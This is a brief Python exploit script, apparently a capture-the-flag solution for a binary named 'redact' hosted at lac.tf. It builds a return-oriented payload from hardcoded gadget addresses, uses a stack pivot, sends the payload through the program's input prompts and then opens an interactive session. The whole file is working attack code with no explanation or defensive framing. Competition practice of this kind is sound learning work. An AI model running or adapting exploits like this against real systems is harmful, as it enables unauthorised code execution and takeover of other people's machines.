#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from rootkit.exploit import *
from time import sleep

exe = context.binary = ELF("./redact")
host = args.HOST or "lac.tf"
port = int(args.PORT or 31181)

gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

libc = SetupLibcELF()
io = start(env={"LD_PRELOAD": "./libm.so.6"})

payload = flat(
    [
        add_gadget(0x404050, 0x7F909EA0E9F0, 0x7F909EA9C61A),
        pivot(0x404050),
    ]
)

sla(b"Enter some text: ", b"AAAAAAA\x00")

sla(
    b"Enter a placeholder: ",
    payload,
)
sla(b"Enter the index of the stuff to redact: ", b"72")

io.interactive()
